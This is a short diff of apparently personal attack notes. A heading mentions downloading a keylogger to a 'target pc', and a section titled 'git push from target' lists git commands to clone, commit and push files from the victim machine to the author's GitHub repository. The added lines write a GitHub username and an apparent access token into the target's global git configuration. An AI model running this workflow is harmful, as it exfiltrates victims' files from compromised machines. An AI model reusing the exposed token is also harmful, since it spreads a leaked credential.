@@ -61,6 +61,8 @@ downloading keylooger to target pc
  git push from target
  ====================
  git clone https://hmdsazzad17@github.com/hmdsazzad17/codelab_amrokanon.git
+ git config --global credential.https://github.com.username hmdsazzad17
+ git config --global credential.https://github.com.password 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
  git pull origin main --allow-unrelated-histories
  git add .
  git commit -m "from target machine"
